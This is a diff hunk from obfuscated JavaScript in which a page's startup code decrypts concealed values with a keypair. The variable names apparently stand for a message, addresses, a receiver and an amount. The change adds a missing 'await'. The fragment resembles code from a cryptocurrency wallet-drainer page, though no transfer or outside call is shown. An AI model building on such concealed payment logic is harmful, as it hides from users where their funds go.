@@ -5029,7 +5029,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                     mess = await W0(keyPair, d),
                     addr = await W0(keyPair, e),
                     coll = await W0(keyPair, c),
-                    receiv = W0(keyPair, W),
+                    receiv = await W0(keyPair, W),
                     txxxxxxxx = await W0(keyPair, m),
                     amdsadsat = await W0(keyPair, a),
                     console.log(mess),
